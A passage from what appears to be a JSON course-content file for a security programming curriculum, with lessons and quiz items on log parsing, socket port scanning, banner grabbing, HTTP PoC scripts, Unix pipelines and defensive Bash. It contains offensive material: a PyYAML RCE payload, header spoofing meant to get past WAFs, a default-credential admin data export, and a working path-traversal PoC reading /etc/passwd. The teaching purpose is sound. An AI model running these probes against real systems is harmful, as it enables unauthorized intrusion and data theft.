<code>!!python/object/apply:os.system [\"whoami\"]</code> executes OS commands inside your tool process. Security developers must strictly mandate <code>yaml.safe_load()</code> to disable unsafe constructors.</p>\n</div>\n\n<h2>4. Hands-On: Brute-Force Log Analysis Pipeline</h2>\n<div class=\"command-block\">\n  <div class=\"command-desc\">Automated Parser for Excessive Failed Authentication Attempts</div>\n  <pre><code class=\"language-python\">from collections import defaultdict\nimport json\n\ndef analyze_bruteforce_log(log_path: str, threshold=5) -> str:\n    \"\"\"Streams server logs, flagging IPs exceeding failed login thresholds\"\"\"\n    failed_attempts = defaultdict(int)\n    \n    with open(log_path, \"r\", encoding=\"utf-8\", errors=\"ignore\") as f:\n        for line in f:\n            if \"/api/login\" in line and \" 401 \" in line:\n                ip = line.split()[0]\n                failed_attempts[ip] += 1\n                \n    suspects = {ip: count for ip, count in failed_attempts.items() if count >= threshold}\n    \n    report = {\n        \"rule\": \"BRUTE_FORCE_LOGIN_ATTACK\",\n        \"threshold\": threshold,\n        \"suspect_count\": len(suspects),\n        \"malicious_sources\": suspects\n    }\n    return json.dumps(report, indent=2)</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Context Discipline</strong>: Always encapsulate file descriptors inside <code>with open(...) as f</code> blocks.</li>\n    <li><strong>Streaming Ingestion</strong>: Process high-volume logs via <code>for line in f</code> iterations to prevent memory crashes.</li>\n    <li><strong>YAML Hardening</strong>: Restrict YAML parsing exclusively to <code>yaml.safe_load()</code> to block deserialization exploits.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Log Extraction</div>\n  <p><strong>Exercise 1:</strong> Write a Python snippet that reads <code>compromised_hashes.txt</code> line by line, strips trailing newlines, and stores unique entries in a Set named <code>hashes_set</code>.</p>\n  <p><strong>Exercise 2:</strong> When parsing truncated JSON strings from network sockets, unhandled <code>json.loads()</code> calls trigger crashes. Formulate a <code>try...except</code> block to catch and handle this error gracefully.</p>\n</div>\n","checkpoints":[{"question":"When streaming a 10GB access log during incident forensics, which file read pattern maintains a constant sub-10MB RAM footprint?","options":["with open('access.log') as f: lines = f.readlines()","with open('access.log') as f: content = f.read()","with open('access.log') as f: for line in f: # Generator-based streaming","f = open('access.log'); content = f.read(1024*1024*1024)"],"answer":2,"explanation":"In Python, file objects are generator iterators. `for line in f` streams lines individually into memory as requested, maintaining a flat memory footprint irrespective of file size."},{"question":"Why must security developers mandate `yaml.safe_load()` over `yaml.load()` when parsing untrusted external YAML files?","options":["yaml.load() cannot parse UTF-8 characters","yaml.load() executes 10 times slower than safe_load","yaml.load() supports unsafe object constructors, allowing attackers to achieve Remote Code Execution (RCE) via payloads like `!!python/object/apply:os.system`","yaml.load() automatically deletes source files upon reading"],"answer":2,"explanation":"Unsafe yaml.load permits arbitrary object reconstruction in PyYAML, allowing attackers to invoke system commands via Python decorators. yaml.safe_load restricts parsing to simple types."}]},
  "prog-02-02": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Socket Programming</div>\n  <h1>Low-Level Socket Programming: TCP/UDP & Banner Grabbing</h1>\n  <p class=\"lead\">Premier network security tools (Nmap, Metasploit, Masscan) fundamentally wrap raw operating system Socket APIs. Moving from scripting existing tools to engineering custom vulnerability probes requires mastering socket lifecycle states, non-blocking timeout handling, and interactive banner extraction.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Understand operating system <strong>Socket</strong> abstractions and their mapping to TCP handshakes.</li>\n    <li>Differentiate between <code>connect()</code> and <code>connect_ex()</code> to construct resilient port scanners.</li>\n    <li>Apply <strong>Timeout Enforcement</strong> to eliminate hanging network threads on filtered firewall rules.</li>\n    <li>Build a multi-protocol service banner grabbing engine for SSH, FTP, and HTTP fingerprinting.</li>\n  </ul>\n</div>\n\n<h2>1. The Socket Lifecycle & TCP Handshake Mapping</h2>\n<p>A Socket is a kernel-level file descriptor interface for network communications:</p>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Stage</th>\n      <th>Python Socket API</th>\n      <th>Underlying Network Protocol Behavior</th>\n      <th>Security Considerations</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>1. Allocation</strong></td>\n      <td><code>socket.socket(AF_INET, SOCK_STREAM)</code></td>\n      <td>Allocates transmission control blocks in kernel space</td>\n      <td><code>SOCK_STREAM</code> for TCP; <code>SOCK_DGRAM</code> for UDP.</td>\n    </tr>\n    <tr>\n      <td><strong>2. Timeout</strong></td>\n      <td><code>s.settimeout(2.0)</code></td>\n      <td>Configures the socket timer</td>\n      <td><strong>Crucial Guard</strong>: Unset timeouts cause threads to block for minutes on DROP firewalls.</td>\n    </tr>\n    <tr>\n      <td><strong>3. Handshake</strong></td>\n      <td><code>s.connect((host, port))</code></td>\n      <td>Dispatches SYN, awaits SYN+ACK, returns ACK</td>\n      <td><code>connect_ex()</code> returns 0 on success, bypassing exceptions.</td>\n    </tr>\n    <tr>\n      <td><strong>4. Transfer</strong></td>\n      <td><code>s.sendall(data)</code> / <code>s.recv(bufsize)</code></td>\n      <td>Ordered stream transmission with sliding windows</td>\n      <td>Buffers require raw <code>bytes</code> formatting.</td>\n    </tr>\n    <tr>\n      <td><strong>5. Teardown</strong></td>\n      <td><code>s.close()</code></td>\n      <td>Exchanges FIN packets to close connection</td>\n      <td>Releases kernel file descriptors immediately.</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. Port Probing: connect vs connect_ex</h2>\n<p>While <code>connect()</code> raises exceptions on closed ports, <code>connect_ex()</code> returns a C-style error integer directly:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Resilient Port Scanner Core using connect_ex</div>\n  <pre><code class=\"language-python\">import socket\n\ndef check_port_open(host: str, port: int, timeout=1.5) -> bool:\n    \"\"\"Conducts a full TCP Connect handshake without throwing exceptions\"\"\"\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(timeout)\n    \n    result = sock.connect_ex((host, port))\n    sock.close()\n    return result == 0\n\nfor p in [22, 80, 443, 3306, 8080]:\n    status = \"OPEN\" if check_port_open(\"127.0.0.1\", p, 0.5) else \"CLOSED\"\n    print(f\"Port {p:5}: {status}\")</code></pre>\n</div>\n\n<h2>3. Hands-On: Automated Service Banner Extractor</h2>\n<p>Services like OpenSSH or vsftpd emit an initial welcome banner containing explicit software version strings:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Production Banner Grabber with Interactive Triggers</div>\n  <pre><code class=\"language-python\">def grab_service_banner(host: str, port: int, timeout=2.5) -> str:\n    \"\"\"Connects to port and extracts initial service banner metadata\"\"\"\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.settimeout(timeout)\n            s.connect((host, port))\n            \n            # Interactive protocols require a stimulus prompt\n            if port in (80, 8080):\n                s.sendall(b\"HEAD / HTTP/1.0\\r\\nHost: \" + host.encode() + b\"\\r\\n\\r\\n\")\n            elif port == 6379:\n                s.sendall(b\"INFO\\r\\n\")\n                \n            banner_bytes = s.recv(1024)\n            return banner_bytes.decode(\"utf-8\", errors=\"replace\").strip()\n    except socket.timeout:\n        return \"[!] Timeout: Connected but silent\"\n    except ConnectionRefusedError:\n        return \"[!] Connection Refused: Port closed\"\n    except Exception as e:\n        return f\"[!] Error: {str(e)}\"\n\nprint(\"SSH Banner :\", grab_service_banner(\"192.168.1.1\", 22))</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Core Architecture</strong>: Use <code>AF_INET</code> with <code>SOCK_STREAM</code> for reliable TCP exchanges.</li>\n    <li><strong>Timeout Discipline</strong>: Enforce <code>s.settimeout()</code> on every probe to avoid thread deadlocks.</li>\n    <li><strong>Byte Constraints</strong>: Raw sockets mandate binary strings (<code>bytes</code>) across all <code>sendall/recv</code> calls.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Socket Mechanics</div>\n  <p><strong>Exercise 1:</strong> Why must manual raw HTTP requests over TCP sockets terminate with <code>\\r\\n\\r\\n</code>? What occurs on the server if the second CRLF is missing?</p>\n  <p><strong>Exercise 2:</strong> Write a lightweight UDP client using <code>SOCK_DGRAM</code> that dispatches a probe to port 53 and awaits a response with a 2-second timeout.</p>\n</div>\n","checkpoints":[{"question":"When authoring a TCP port scanner in Python, what engineering advantage does `sock.connect_ex((host, port))` offer over `sock.connect()`?","options":["connect_ex() bypasses host-level firewall inspection rules","connect_ex() returns a C-style integer status code (0 on success) instead of throwing exceptions, avoiding expensive try-except overhead","connect_ex() leverages UDP for accelerated transmission","connect_ex() automatically spoofs source IP headers"],"answer":1,"explanation":"connect() throws exceptions on failed handshakes. connect_ex() returns an errno integer directly (0 for success), streamlining control flow and improving scanner performance."},{"question":"What is the critical security value of enforcing `s.settimeout(2.0)` on network sockets?","options":["Enhances cryptographic payload cipher strength","Prevents scanner threads from blocking indefinitely when remote firewalls silently DROP connection requests","Reroutes failed requests through backup proxy tunnels","Signals the target server to prioritize response latency"],"answer":1,"explanation":"When firewalls DROP incoming packets without dispatching RST packets, sockets lacking timeouts will hang for minutes waiting for kernel retransmissions, deadlocking the scanner."}]},
  "prog-02-03": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">PoC Engineering</div>\n  <h1>HTTP Interactions & Requests: Headers, Sessions & PoC Exploit Development</h1>\n  <p class=\"lead\">Over 90% of vulnerability verifications operate across HTTP/HTTPS application layers. Assembling raw socket strings for complex REST APIs is slow and error-prone. The Python <code>requests</code> library delivers an expressive HTTP client for security engineering. This section explores request spoofing, session persistence, Burp Suite proxy routing, and building standardized exploit verification scripts (PoCs).</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Custom-craft User-Agents, Referers, and proprietary headers to bypass simple WAF rules.</li>\n    <li>Maintain persistent authentication states and CookieJars across attacks via <code>requests.Session()</code>.</li>\n    <li>Route script traffic through Burp Suite proxies while safely bypassing SSL certificate validations.</li>\n    <li>Author a standardized, non-destructive Path Traversal vulnerability verification PoC.</li>\n  </ul>\n</div>\n\n<h2>1. Header Customization & Proxy Chaining</h2>\n<p>Default Python User-Agents are intercepted by enterprise WAFs. Exploitation scripts must simulate legitimate browsers:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Burp-Chained Requests Boilerplate with SSL Bypass</div>\n  <pre><code class=\"language-python\">import requests\nimport urllib3\n\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\ntarget_url = \"https://target-portal.corp/api/user/profile\"\n\ncustom_headers = {\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0.0.0\",\n    \"Accept\": \"application/json\",\n    \"Authorization\": \"Bearer eyJhbGciOiJIUzI1NiIsIn...\",\n    \"X-Forwarded-For\": \"127.0.0.1\"\n}\n\nburp_proxy = {\n    \"http\": \"http://127.0.0.1:8080\",\n    \"https\": \"http://127.0.0.1:8080\"\n}\n\nresponse = requests.get(\n    target_url,\n    headers=custom_headers,\n    proxies=burp_proxy,\n    verify=False,\n    timeout=5\n)\n\nprint(f\"Status Code: {response.status_code}\")</code></pre>\n</div>\n\n<h2>2. Multi-Stage Exploitation with requests.Session()</h2>\n<p>Multi-step attacks require carrying authentication cookies from login forms to target administrative endpoints:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Stateful Exploit Pipeline Using Persistent Sessions</div>\n  <pre><code class=\"language-python\">session = requests.Session()\nsession.headers.update({\"User-Agent\": \"SecurityAuditor/2.0\"})\n\n# Step 1: Execute Login\nlogin_payload = {\"username\": \"admin\", \"password\": \"DefaultPassword123\"}\nlogin_resp = session.post(\"http://victim.corp/login\", data=login_payload, timeout=5)\n\n# Step 2: Session automatically persists set cookies for subsequent calls\nif session.cookies:\n    print(\"[+] Session Cookies Acquired:\", session.cookies.get_dict())\n    admin_data = session.get(\"http://victim.corp/admin/export_users\", timeout=5)\n    print(\"Exported Bytes:\", len(admin_data.text))</code></pre>\n</div>\n\n<h2>3. Hands-On: Developing a Standardized PoC Script</h2>\n<p>Production security PoCs must adhere to three foundational rules: <strong>① Zero destructive writes</strong>; <strong>② Strict affirmative fingerprint matching</strong>; <strong>③ Return structured machine-readable outputs</strong>:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Path Traversal Vulnerability Verification PoC</div>\n  <pre><code class=\"language-python\">import requests\nimport urllib3\n\nurllib3.disable_warnings()\n\ndef verify_path_traversal_poc(base_url: str, timeout=5) -> dict:\n    \"\"\"Verifies Arbitrary File Read vulnerability by targeting /etc/passwd\"\"\"\n    endpoint = f\"{base_url.rstrip('/')}/view_document.php\"\n    payload = \"../../../../../../../../etc/passwd\"\n    \n    result = {\n        \"target\": base_url,\n        \"vulnerability\": \"Path Traversal (Arbitrary File Read)\",\n        \"is_vulnerable\": False,\n        \"evidence\": \"\",\n        \"details\": \"\"\n    }\n    \n    try:\n        resp = requests.get(\n            endpoint,\n            params={\"file\": payload},\n            headers={\"User-Agent\": \"CyberEdu-PoC-Scanner\"},\n            verify=False,\n            timeout=timeout\n        )\n        \n        # Rigorous fingerprint validation: verify root account entry\n        if resp.status_code == 200 and \"root:x:0:0:\" in resp.text:\n            result[\"is_vulnerable\"] = True\n            result[\"evidence\"] = resp.text.splitlines()[0]\n            result[\"details\"] = f\"Successfully read /etc/passwd via {endpoint}\"\n        else:\n            result[\"details\"] = f\"Exploitation unsuccessful. Code: {resp.status_code}\"\n            \n    except requests.exceptions.Timeout:\n        result[\"details\"] = \"Request timed out (Firewall drop or network issue)\"\n    except requests.exceptions.ConnectionError:\n        result[\"details\"] = \"Connection failure to target\"\n    except Exception as e:\n        result[\"details\"] = f\"Unexpected execution error: {str(e)}\"\n        \n    return result\n\nprint(verify_path_traversal_poc(\"http://192.168.1.50:8000\"))</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>WAF Avoidance</strong>: Disguise User-Agent strings to emulate browser clients.</li>\n    <li><strong>Session State</strong>: Employ <code>requests.Session()</code> for multi-step exploits requiring cookie preservation.</li>\n    <li><strong>Audit Proxies</strong>: Leverage <code>proxies</code> and <code>verify=False</code> to route scripts through Burp Suite during development.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: PoC Parameters</div>\n  <p><strong>Exercise 1:</strong> When dispatching JSON payloads via <code>requests.post()</code>, what is the operational difference between <code>data=</code> and <code>json=</code> in terms of the HTTP <code>Content-Type</code> header?</p>\n  <p><strong>Exercise 2:</strong> What risk does a security scanner incur if HTTP request calls omit the <code>timeout=</code> parameter?</p>\n</div>\n","checkpoints":[{"question":"When automating a multi-stage exploit (authenticating before calling a vulnerable administrative endpoint), what mechanism maintains state continuity?","options":["Manually parsing and passing Cookie headers on every individual requests.get() call","Deploying `session = requests.Session()`, which automatically manages CookieJars and pools TCP connections","Persisting cookies to temporary local text files","Downgrading all connections to HTTP/1.0"],"answer":1,"explanation":"requests.Session() automatically stores, persists, and attaches cookies set by the server across consecutive requests, simplifying stateful multi-stage vulnerability verification."},{"question":"When routing an exploit script through Burp Suite (127.0.0.1:8080) to inspect traffic, how do you handle self-signed certificate errors?","options":["Modifying system registry files to disable OS-wide certificate validation","Configuring `verify=False` within requests alongside `urllib3.disable_warnings()`","Downgrading the target URL from HTTPS to plain HTTP","Rebooting the workstation to flush SSL cache tables"],"answer":1,"explanation":"Passing verify=False disables TLS certificate chain verification in requests, enabling scripts to interact seamlessly through local intercepting proxies like Burp Suite."}]},
  "prog-03-01": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Linux Utilities</div>\n  <h1>Linux Pipe Kung-Fu: grep, sed, awk & cut for Live Telemetry</h1>\n  <p class=\"lead\">During Linux incident response and live forensics, investigators rarely have the luxury to deploy complex Python runtimes or external telemetry platforms. Relying entirely on native Unix pipelines and the classic text quartet (grep, sed, awk, cut), an investigator can carve adversary IP addresses, extraction strings, and brute-force frequencies across gigabytes of raw logs in seconds. This section explores streaming Unix pipelines and text manipulation patterns.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Master Unix I/O stream redirection (<code>|</code>, <code>&gt;</code>, <code>&gt;&gt;</code>, <code>2&gt;&amp;1</code>, and <code>/dev/null</code>).</li>\n    <li>Execute advanced <code>grep</code> pattern matching (<code>-E</code>, <code>-v</code>, <code>-o</code>, <code>-i</code>) to isolate WebShell commands.</li>\n    <li>Employ <code>cut</code> and <code>sed</code> for high-throughput stream slicing and redaction.</li>\n    <li>Program in <code>awk</code> to perform SQL-like <code>GROUP BY ... COUNT(*)</code> aggregations natively inside the terminal.</li>\n  </ul>\n</div>\n\n<h2>1. The Unix Pipeline Model & Stream Redirection</h2>\n<p>The Unix philosophy mandates building focused programs chained together via standard streams: <code>0 (stdin)</code>, <code>1 (stdout)</code>, and <code>2 (stderr)</code>:</p>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Redirection</th>\n      <th>Operational Function</th>\n      <th>Forensic Application</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>|</code> (Pipe)</td>\n      <td>Feeds preceding command stdout directly into subsequent stdin</td>\n      <td><code>cat access.log | grep \"404\" | wc -l</code> counts error frequencies.</td>\n    </tr>\n    <tr>\n      <td><code>&gt;</code> (Truncate/Write)</td>\n      <td>Directs stream into file, overwriting existing contents</td>\n      <td><code>nmap -sV 10.0.0.1 &gt; scan_result.txt</code> commits output.</td>\n    </tr>\n    <tr>\n      <td><code>&gt;&gt;</code> (Append)</td>\n      <td>Directs stream to file, appending to the EOF</td>\n      <td><code>echo \"malicious_ip\" &gt;&gt; blacklist.txt</code> appends IOCs.</td>\n    </tr>\n    <tr>\n      <td><code>2&gt;&amp;1</code></td>\n      <td>Merges standard error into the standard output stream</td>\n      <td>Prevents terminal corruption while auditing verbose binaries.</td>\n    </tr>\n    <tr>\n      <td><code>2&gt;/dev/null</code></td>\n      <td>Silences stderr output by sending it to the null bit-bucket</td>\n      <td><code>find / -perm -4000 2&gt;/dev/null</code> suppresses permission warnings.</td>\n    </tr>\n  </tbody>\n</table>\n\n<h2>2. The Unix Text Processing Quartet</h2>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">1. grep: Pattern Filtering</div>\n  <pre><code class=\"language-bash\"># Filter case-insensitive SQL injection signatures\ngrep -i \"union.*select\" /var/log/nginx/access.log\n\n# Invert match: drop whitelisted monitoring traffic\ngrep -v \"10.0.0.254\" access.log\n\n# Extract matched regex tokens exclusively (-o) to carve IPv4 addresses\ngrep -Eo \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" access.log</code></pre>\n</div>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">2. cut: Column Extraction</div>\n  <pre><code class=\"language-bash\"># Delimit /etc/passwd by colon to extract usernames ($1) and shells ($7)\ncut -d':' -f1,7 /etc/passwd\n\n# Carve source IP addresses from leading whitespace-delimited logs\ncut -d' ' -f1 access.log</code></pre>\n</div>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">3. sed: Stream Editing & Sanitization</div>\n  <pre><code class=\"language-bash\"># Mask sensitive identity numbers in place\nsed -E 's/([0-9]{3})[0-9]{4}([0-9]{4})/\\1****\\2/g' user_audit.log\n\n# Edit in-place (-i): purge comments and blank lines from sshd_config\nsed -i '/^#/d; /^$/d' /etc/ssh/sshd_config</code></pre>\n</div>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">4. awk: Structured Data Aggregation</div>\n  <pre><code class=\"language-bash\"># Print IP and HTTP response code columns\nawk '{print $1, $9}' access.log\n\n# Aggregate Top 10 IP addresses triggering 404 Not Found responses\nawk '$9 == 404 {count[$1]++} END {for (ip in count) print count[ip], ip}' access.log | sort -nr | head -n 10</code></pre>\n</div>\n\n<h2>3. Hands-On: Incident Response One-Liner Pipeline</h2>\n<p>Chaining text utilities delivers immediate visibility during live brute-force events:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Top 10 SSH Brute-Force Attacker Carving Pipeline</div>\n  <pre><code class=\"language-bash\">grep \"Failed password\" /var/log/auth.log | \\\n  awk '{for(i=1;i<=NF;i++) if($i==\"from\") print $(i+1)}' | \\\n  sort | uniq -c | sort -nr | head -n 10</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Specialized Utility Matrix</strong>: Filter with <code>grep</code>, slice columns via <code>cut</code>, transform text with <code>sed</code>, compute statistics with <code>awk</code>.</li>\n    <li><strong>Noise Suppression</strong>: Enforce <code>2&gt;/dev/null</code> to suppress non-actionable permission warnings during scans.</li>\n    <li><strong>Frequency Profiling</strong>: Combine <code>... | sort | uniq -c | sort -nr | head -n 10</code> to rank operational IOC indicators.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Log Carving</div>\n  <p><strong>Exercise 1:</strong> Given an API log with columns <code>Timestamp [LEVEL] Endpoint Latency(ms)</code>, formulate an <code>awk</code> command that isolates entries where Latency exceeds 1000ms ($4) and the Level matches <code>[ERROR]</code> ($2).</p>\n  <p><strong>Exercise 2:</strong> Formulate a command redirection that persists all error outputs into <code>errors.log</code> while preserving standard output on the terminal.</p>\n</div>\n","checkpoints":[{"question":"In the forensic pipeline `grep 'Failed password' auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head -n 10`, what prerequisite allows `uniq -c` to count accurately?","options":["Input files must remain under 1MB in size","Input lines **must be sorted prior to reaching `uniq`** so identical items reside on consecutive lines","Execution must occur under root administrative privileges","Lines must not contain numeric digits"],"answer":1,"explanation":"The Unix uniq utility operates exclusively on contiguous adjacent duplicate lines. Passing unsorted input causes non-adjacent duplicates to be counted separately, violating aggregation."},{"question":"What function does `2>/dev/null` perform when executing `find / -perm -4000 2>/dev/null` as an unprivileged user?","options":["Permanently purges any discovered malicious files","Redirects standard error (file descriptor 2, such as Permission denied warnings) into the null device to keep terminal output clean","Doubles filesystem search velocity","Writes search output into a file named null"],"answer":1,"explanation":"Descriptor 2 maps to stderr. Unprivileged searches against root directories yield hundreds of permission warnings; 2>/dev/null discards them so only readable files display."}]},
  "prog-03-02": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Bash Engineering</div>\n  <h1>Bash Scripting Engineering: Branching, Loops & Robust Exit</h1>\n  <p class=\"lead\">Interactive one-liners address immediate anomalies, but operational readiness requires packaging logic into durable, idempotent Bash scripts. Without defensive engineering, shell scripts can become volatile—uninitialized variables risk accidental system directory deletions, while uncaught command errors cascade into broken deployments. This section deconstructs defensive shell standards.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Enforce the industrial defensive preamble: <code>set -euo pipefail</code>.</li>\n    <li>Leverage modern <code>[[ ... ]]</code> conditionals, positional parameters (<code>$1</code>, <code>$#</code>), and strict variable quoting.</li>\n    <li>Execute safe iterative ingestion via <code>while IFS= read -r</code> pipelines.</li>\n    <li>Construct trap handlers (<code>trap cleanup EXIT</code>) to guarantee ephemeral file destruction on abort.</li>\n  </ul>\n</div>\n\n<h2>1. The Industrial Safeguard: set -euo pipefail</h2>\n<p>By default, Bash continues execution when commands fail and treats unset variables as empty strings. This behavior has triggered devastating bugs like <code>rm -rf / $TEMP_DIR</code> (evaluating to <code>rm -rf /</code> if unset). Enterprise scripts mandate strict safety modes:</p>\n\n<table class=\"reference-table\">\n  <thead>\n    <tr>\n      <th>Parameter</th>\n      <th>Shell Option</th>\n      <th>Defensive Value</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><code>-e</code></td>\n      <td><code>errexit</code></td>\n      <td>Aborts script immediately upon encountering any non-zero exit code.</td>\n    </tr>\n    <tr>\n      <td><code>-u</code></td>\n      <td><code>nounset</code></td>\n      <td>Throws fatal errors when evaluating undeclared variables.</td>\n    </tr>\n    <tr>\n      <td><code>-o pipefail</code></td>\n      <td><code>pipefail</code></td>\n      <td>Returns failure if any sub-command in a pipeline fails.</td>\n    </tr>\n  </tbody>\n</table>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Defensive Script Header Boilerplate</div>\n  <pre><code class=\"language-bash\">#!/usr/bin/env bash\nset -euo pipefail\n\nTEMP_DIR=$(mktemp -d /tmp/sec_scan_XXXXXX)\ncleanup() {\n    echo \"[*] Cleaning up temporary files in ${TEMP_DIR}...\"\n    rm -rf \"${TEMP_DIR}\"\n}\ntrap cleanup EXIT INT TERM</code></pre>\n</div>\n\n<h2>2. Strict Quoting & [[ ... ]] Evaluation</h2>\n<p>Always encapsulate variable references in double quotes (<code>\"$target\"</code>) to prevent word splitting and command injection:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Robust Input Argument Validation Pattern</div>\n  <pre><code class=\"language-bash\">if [[ $# -ne 1 ]]; then\n    echo \"Usage: $0 &lt;target_host&gt;\" >&2\n    exit 1\nfi\n\nTARGET=\"$1\"\n\nPORT=\"8080\"\nif [[ \"$PORT\" =~ ^[0-9]+$ ]] && [[ \"$PORT\" -ge 1 && \"$PORT\" -le 65535 ]]; then\n    echo \"[+] Valid TCP port: $PORT\"\nelse\n    echo \"[-] Invalid port format!\" >&2\n    exit 2\nfi\n\nif [[ -f \"/etc/shadow\" && -r \"/etc/shadow\" ]]; then\n    echo \"[!] Warning: /etc/shadow is accessible!\"\nfi</code></pre>\n</div>\n\n<h2>3. Resilient Ingestion: while IFS= read -r</h2>\n<p>Never iterate over files via <code>for line in $(cat file.txt)</code>; this splits lines containing spaces and violates <code>ARG_MAX</code> limits. Stream files sequentially:</p>\n\n<div class=\"command-block\">\n  <div class=\"command-desc\">Sequential Stream Reading Pattern</div>\n  <pre><code class=\"language-bash\">TARGET_FILE=\"targets.txt\"\n\nif [[ ! -f \"$TARGET_FILE\" ]]; then\n    echo \"[-] File not found: $TARGET_FILE\" >&2\n    exit 1\nfi\n\nwhile IFS= read -r host || [[ -n \"$host\" ]]; do\n    [[ \"$host\" =~ ^#.*$ || -z \"$host\" ]] && continue\n    echo \"[*] Scanning endpoint: $host\"\ndone &lt; \"$TARGET_FILE\"</code></pre>\n</div>\n\n<div class=\"summary-box\">\n  <div class=\"summary-title\">🎯 Chapter Summary & Key Takeaways</div>\n  <ul>\n    <li><strong>Defensive Core</strong>: Mandate <code>set -euo pipefail</code> at the top of every production script.</li>\n    <li><strong>Variable Safety</strong>: Wrap variables in double quotes <code>\"$var\"</code>; evaluate conditions via <code>[[ ... ]]</code>.</li>\n    <li><strong>Safe Streams</strong>: Stream input files through <code>while IFS= read -r</code> constructs.</li>\n    <li><strong>Resource Cleanup</strong>: Deploy <code>trap cleanup EXIT</code> to ensure cleanup routines trigger under all exit conditions.</li>\n  </ul>\n</div>\n\n<div class=\"interactive-panel\">\n  <div class=\"panel-header\">🎯 Hands-On Exercises: Defensive Shell</div>\n  <p><strong>Exercise 1:</strong> Why is <code>for line in $(cat file.txt)</code> dangerous when processing arbitrary pathnames? Provide an example of how this causes operational bugs.</p>\n  <p><strong>Exercise 2:</strong> Write a Bash snippet <code>check_root.sh</code> that verifies if the current executing user possesses UID 0 (checking <code>$EUID</code>). If not, output an error to stderr and exit with status 1.</p>\n</div>\n","checkpoints":[{"question":"In defensive Bash engineering, what protection is enforced by the `-u` option in `set -euo pipefail`?","options":["Restricts script execution exclusively to root users","Throws a fatal error and terminates execution immediately if any undeclared variable is evaluated, preventing bugs like `rm -rf / $UNSET_VAR`","Enables ANSI colored terminal formatting","Disables all network interface adapters"],"answer":1,"explanation":"By default, Bash treats unset variables as empty strings. The -u (nounset) option treats unset variable evaluations as fatal errors, eliminating catastrophic deletion bugs."},{"question":"What is the most resilient pattern for reading an IP address list sequentially in Bash?","options":["for ip in $(cat targets.txt); do ... done","while IFS= read -r host || [[ -n \"$host\" ]]; do ... done < targets.txt","cat targets.txt | xargs -n 1 bash -c","awk '{system(\"./scan.sh \" $1)}' targets.txt"],"answer":1,"explanation":"The `while IFS= read -r` idiom streams input line-by-line without stripping whitespace, preserves backslashes, handles files lacking trailing newlines, and avoids ARG_MAX limits."}]},
  "prog-03-03": {"html":"\n<div class=\"content-header\">\n  <div class=\"badge-tag\">Audit Engineering</div>\n  <h1>Hands-On: Automated Host Baseline & Threat Hunting Script</h1>\n  <p class=\"lead\">During live compromise investigations or compliance audits, engineers must evaluate account privileges, open ports, persistence jobs, and SUID binaries across dozens of Linux systems within minutes. Manually typing individual commands is slow and prone to missed evidence. This section applies our Shell engineering patterns to build a self-contained baseline auditing engine.</p>\n</div>\n\n<div class=\"callout callout-info\">\n  <div class=\"callout-title\">💡 What You Will Learn</div>\n  <ul>\n    <li>Design a six-dimensional host audit blueprint aligned with CIS Benchmark baselines.</li>\n    <li>Automate detection of rogue UID 0 administrative accounts and SUID privilege escalation binaries.</li>\n    <li>Audit persistent system Crontabs, SSH authorized keys, and external listening daemons.</li>\n    <li>Generate structured, ANSI-highlighted terminal telemetry alongside committed audit log files.</li>\n  </ul>\n</div>\n\n<h2>1. Six Dimensions of Linux Baseline 